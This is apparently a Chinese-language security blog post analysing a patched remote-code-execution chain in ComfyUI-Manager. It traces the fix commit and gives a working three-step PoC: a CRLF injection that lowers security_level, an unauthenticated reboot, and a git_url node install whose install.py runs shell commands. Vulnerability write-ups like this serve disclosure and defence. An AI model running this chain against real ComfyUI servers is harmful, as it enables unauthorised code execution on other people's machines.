#  ComfyUI-Manager RCE链组合拳  
原创 lufei  lufeisec   2026-01-13 00:00  
  
   
  
# 一、前言  
## 1.1、组件信息  
  
ComfyUI-Manager 是一个旨在提升 ComfyUI 可用性的扩展。它提供管理功能，用于安装、移除、禁用和启用 ComfyUI 的各种自定义节点。此外，该扩展还提供了枢纽功能和便捷功能，方便访问 ComfyUI 内的各种信息。  
## 1.2、影响版本  
  
ComfyUI-Manager < 3.39.2  
  
ComfyUI-Manager < 4.0.5   
# 二、漏洞分析  
## 2.1、RCE链分析  
### 2.1.1、环境搭建  
```
python3 -m pip install virtualenv
git clone https://github.com/comfyanonymous/ComfyUI
cd ComfyUI/custom_nodes
git clone -b 3.39.1 https://github.com/ltdrdata/ComfyUI-Manager comfyui-manager
cd ..
python -m venv venv
source venv/bin/activate
python -m pip install torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/cu121
python -m pip install -r requirements.txt
python -m pip install -r custom_nodes/comfyui-manager/requirements.txt
cd ..
python main.py --preview-method auto --cpu

```  
### 2.2.2、CRLF分析  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PspOIv6iblibk1Eiag27diaJcAic5JIfKYWYp3OR4mks5gcU6LLcIfTSSjPbQ/640?wx_fmt=png&from=appmsg "null")  
  
  
漏洞commit  
  
https://github.com/Comfy-Org/ComfyUI-Manager/commit/f4fa394e0f03b013f1068c96cff168ad10bd0410  
#### a、sink分析  
  
根据漏洞commit，我们很快就能确定出漏洞函数(write_config)。如图所示，很经典的CRLF漏洞修复处理（处理掉\r、\n、\x00字符），然后再安全写入到文件到中去。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsAoxw8ekaicNTQM7R7iah5PicwQa91Q41FAibWJpq3qvvyud7vaLqxbyyiag/640?wx_fmt=png&from=appmsg "null")  
  
#### b、data flolw & souce分析  
  
这里的数据流分析很简单，所以跟source一起分析了。  
  
api server服务基本都集中在：ComfyUI-Manager/glob/manager_server.py文件中，所以我们基本上分析这个python文件souce即可。  
  
在该文件中/manager/policy/component这个api接口就使用了write_config函数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsE6DgFLmekS1MekP8lW1k6d0bDXE5tgMyuWm6NbJPzj0TsOibpo4xPGA/640?wx_fmt=png&from=appmsg "null")  
  
  
其中通过set_component_policy函数进行改动core.config的配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsAOlrQF73emNJ4q0kk8V3VBpwfia91QfzNqHhRIiawydgm7Ev7ibVHJZzw/640?wx_fmt=png&from=appmsg "null")  
  
#### c、完整链路 & PoC  
  
api接口manager/policy/component（component_policy） -> 通过set_component_policy赋值带入CRLF -> core.write_config写入值造成CRLF注入。  
  
这里构造构造注入ini配置文件需要注意一下。  
```
cat ComfyUI/user/__manager/config.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9Psx7UIZHVM4N5bIXTwdLNsrXtZdm2hAwoEdSiaOukH8libtDicB30HmCt1A/640?wx_fmt=png&from=appmsg "null")  
  
  
这里需要注意'\r'作为换行，而不是\n作为换行（使用了python的ConfigParser），因为会替换\n为\n\t导致CRLF后的属性注入失败。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9Ps0gJYVzibYIO4ENAtfnicYUbicBNdX0HiaAqtrAlPac9hoBlicF72iak1apiaw/640?wx_fmt=png&from=appmsg "null")  
  
  
并且这里有多个注入点我们使用manager/db_mode就是为了注入在原有配置的security_level后面，我们使用PoC如下：```
curl 'http://127.0.0.1:8188/manager/db_mode?value=workflow%0dsecurity_level=weak' -I
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PspXBjw86Ks4uIhdz7ZJakAQ3CicdDHDSLHict3VwMoH743lZibibe8Tf8yA/640?wx_fmt=png&from=appmsg "null")  
  
  
完成注入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsnicKhYibRMPRD62DZ4gIymXv14qV9whcicNca22kchnrb0IkVgksaY2jQ/640?wx_fmt=png&from=appmsg "null")  
  
### 2.2.3、RCE链分析  
  
上面仅仅完成了配置文件的注入，可以配置文件的修改有什么作用呢？并且服务ComfyUI-Manager是否会自动更新配置呢？  
#### a、sink点1 - 重启服务  
  
发现/manager/reboot接口不需要任何身份验证，即可执行重启服务，也就是可以直接加载配置文件了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsTN1VKjj406EueJo24TTnrWj2yzSm5voAauBoF4iaskxEltKmU5LzEZg/640?wx_fmt=png&from=appmsg "null")  
  
  
这里的身份验证比较简单，查询配置中的security_level等级，如果配置中的等级低于接口的等级接口就允许（配置文件中默认是normal），也就是/manager/reboot接口默认有权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsgfNzS1TXzEibAUub0KNUTdeEkh6kz8GtzC3JiaAjQof5JPQW15Ou7uww/640?wx_fmt=png&from=appmsg "null")  
  
```
curl http://127.0.0.1:8188/manager/reboot
```  
#### b、sink点2 - 执行远程python文件  
  
前面做了那么多的铺垫，其实就是为了进行权限绕过使用/customnode/install/git_url接口：我们通过配置文件覆盖，重启服务，成功将安全等级降级为weak也就是可以使用该接口。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9Ps9VBJ31jBR1wCJC5E8DrdQCPwPm5O8ib4faOkNJUPXF2e5q2aGNKvjVQ/640?wx_fmt=png&from=appmsg "null")  
  
  
分析这个接口时候，发现core.gitclone_install(url)函数后端会再使用execute_install_script函数，最终调用[sys.executable, "install.py"]命令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9PsJZwStggQeTnHjsnNr6z6LTrc2qG6XaDCfYWkG2QflYrksO8I2oxHCw/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9Psy8MwFpVn9av1WlibtM3aSJ6UConwbXqDw3lbAowiaOCpDHA0ynC0DqQg/640?wx_fmt=png&from=appmsg "null")  
  
  
我们在github上创建一个空的项目，新建一个install.py文件  
```
import os

os.system("touch /tmp/lufeisec")
```  
  
最终进行加载即可  
```
curl -X POST http://127.0.0.1:8188/api/customnode/install/git_url -d 'https://github.com/xxxxx/test_poc'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGS0keugkiaK9iaiattJZdpX9Ps3BF5ZDlwfwTrW5LxvkBzc2yhyhyZ9Nuk494wU2MX5WaqN1MsneuCpw/640?wx_fmt=png&from=appmsg "null")  
  
# 三、总结  
## 3.1、漏洞总结  
  
1、修改配置文件，为了降低程序运行的等级  
```
curl 'http://127.0.0.1:8188/manager/db_mode?value=workflow%0dsecurity_level=weak' -I
```  
  
2、重启系统，为了重启加载配置生效  
```
curl http://127.0.0.1:8188/manager/reboot
```  
  
3、运行敏感函数，能够进行RCE  
```
curl -X POST http://127.0.0.1:8188/api/customnode/install/git_url -d 'https://github.com/xxxxx/test_poc'
```  
## 3.2、最后  
  
python的ini-format居然是\r进行分割，纠结了很久。  
  
  
云安全系列  
  
[云安全 - k8s ingress漏洞进一步探索引发的源码层面的文件漏洞利用特性分析（golang、java、php）](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484504&idx=1&sn=6c16443c92cec6973ef0c0f791bfa673&scene=21#wechat_redirect)  
  
  
[云对象存储桶写漏洞？模型和数据被投毒、机器沦陷？- AI & 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484486&idx=1&sn=b703890fc5173946b326edd3474a6515&scene=21#wechat_redirect)  
  
  
[你的k8s集群又被拿下了？IngressNightmare - 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484462&idx=1&sn=002c1dbfb0b80b864ced504d495ee5b3&scene=21#wechat_redirect)  
  
  
[21年挖的对象存储漏洞到现在结束了吗？- 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484412&idx=1&sn=a5e2f663197fdd2fda9f5c1e854866a3&scene=21#wechat_redirect)  
  
  
  
域安全  
  
[还看！dump你的域hash来了！-  域安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484395&idx=1&sn=d01914b9778f2d24d3d708781e9cf403&scene=21#wechat_redirect)  
  
  
[域安全-PrintNightmare打域控漏洞的一次艰难利用](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484304&idx=1&sn=3dec842400e5d6878c0a7032e0010a00&scene=21#wechat_redirect)  
  
  
  
AI安全&应用  
  
[AiBrowser-AI快捷安全连接的私域文档](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484535&idx=1&sn=b7433b3e048d0d9263383f5c8761d808&scene=21#wechat_redirect)  
  
  
[加载数据集或模型可能就中毒！大模型供应链安全](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484075&idx=1&sn=a71cb46d562c054d628237d8623eeffa&chksm=fc2ff974cb5870628fad87f92a33c69c89e230b9a655ee844b2b7c19a8bbde0d3ed7d5cc7ecb&scene=21#wechat_redirect)  
  
  
[AI与基础安全结合的新的攻击面](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483958&idx=1&sn=156f308fcc6bd33c7de1080767344c66&chksm=fc2ff9e9cb5870ff98fb357f5c39d85146fd751eeae3eb1b7cd5f299a949f681d89bf00d4eb7&scene=21#wechat_redirect)  
  
  
[AI落地-蓝军之默认密码获取](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483819&idx=1&sn=6d672766eac01164b4846f6deedba511&chksm=fc2ffa74cb587362e450814ddfa606138c9476c283353c880d9df8416c9da99e1bb1eb637073&scene=21#wechat_redirect)  
  
  
  
甲方安全系列  
  
[钓鱼攻防：谁占优势？- 企业安全建设](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484525&idx=1&sn=96dbbcbaf4f255e0c9f1f5a79911ee63&scene=21#wechat_redirect)  
  
  
[打穿AD域漏洞CVE-2025-33073的矛与盾 - 域安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484518&idx=1&sn=74adb9aeec2b4682747a29323449abb3&scene=21#wechat_redirect)  
  
  
[威胁狩猎第一步](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484366&idx=1&sn=56b2eb9d4e28c3d5aee18f072f96913b&scene=21#wechat_redirect)  
  
  
[如何单机实时分析日均数亿安全日志？](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484354&idx=1&sn=3c566e1304f8bf5615bafdb0c866f80b&scene=21#wechat_redirect)  
  
  
[三条命令查杀冰蝎、哥斯拉内存马](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484297&idx=1&sn=60ce5e45397c49b22312309e01304364&chksm=fc2ff856cb5871408b47f4daa239c852e36b4076d1add645d42ceebc18637b90f250d255a4be&scene=21#wechat_redirect)  
  
  
[最近CDN供应链事件的曲折分析与应对-业务安全](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484103&idx=1&sn=7092b50b647334ceda6cc3b6f11c91ea&chksm=fc2ff918cb58700eb25f7e9af09c0ee484aa1ae821666c3a201600e878425ec53e6ab6242c2e&scene=21#wechat_redirect)  
  
  
[BootCDN供应链攻击分析与应对](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483780&idx=1&sn=1f563fbf7f06a3c2df9ac0be96e09502&chksm=fc2ffa5bcb58734d4eccd871e2f6e661b0b4b6e8890d6aacc8702266a86ed427e72d75eca45b&scene=21#wechat_redirect)  
  
  
  
安全BP & SDL & DevSecOps  
  
[深入分析react2shell - 满分漏洞？核弹？CVE-2025-55182](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484549&idx=1&sn=04d83b2e8d521f7b015eccd90dbf257b&scene=21#wechat_redirect)  
  
  
[用AI写了一款AI代码审计去审计AI写的代码（一）](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484374&idx=1&sn=dc22687455ad82641e3e4ed4e6dc3a52&scene=21#wechat_redirect)  
  
  
  
红蓝演习  
  
[java内存马深度利用：窃取明文、钓鱼](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484205&idx=1&sn=7e9b1d48dddb607e604d788bd2557dec&chksm=fc2ff8f2cb5871e422c9da9b342da3e96966590f1fc22693e5b32d496d049321464deca973d7&scene=21#wechat_redirect)  
  
  
[“VT全绿”-手动patch exe免杀](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484180&idx=1&sn=a454e67c8629b8254da900a5c5900a2e&chksm=fc2ff8cbcb5871ddda5f129f5162a46f274afa2968eb242525461acabce72fd69ff214ce11d0&scene=21#wechat_redirect)  
  
  
[挖洞技巧-扩展攻击面](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483741&idx=1&sn=9352a348d8e18a5429c3236e6435c838&chksm=fc2ffa82cb587394e1637cda7389f8cc3d367f9f3a5565f9b8a522d67046a3158a409a9bbfaf&scene=21#wechat_redirect)  
  
  
[weblogic-2019-2725exp回显构造](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483670&idx=1&sn=baa3c2494ac61672543b32d254d0999c&chksm=fc2ffac9cb5873df1720b0a6882129f80d24614b4ec5d676bf10b5e62e09f896833e84a78c41&scene=21#wechat_redirect)  
  
  
[WEB越权-劝你多删参数值](http://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247483676&idx=1&sn=a43204f1c18d1187f7faed1792b62ceb&chksm=fc2ffac3cb5873d50eeb0bf6e87b029ed75ff5c324c708511aceb862240cfc4f4336aa63a67a&scene=21#wechat_redirect)  
  
  
[云安全 - k8s ingress漏洞进一步探索引发的源码层面的文件漏洞利用特性分析（golang、java、php）](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484504&idx=1&sn=6c16443c92cec6973ef0c0f791bfa673&scene=21#wechat_redirect)  
  
  
  
  
其他  
  
[TCP协议区分windows和linux实践 - 远程系统识别](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484307&idx=1&sn=32a01fd3c10d960614235020f217c092&scene=21#wechat_redirect)  
  
  
  
   
  
  
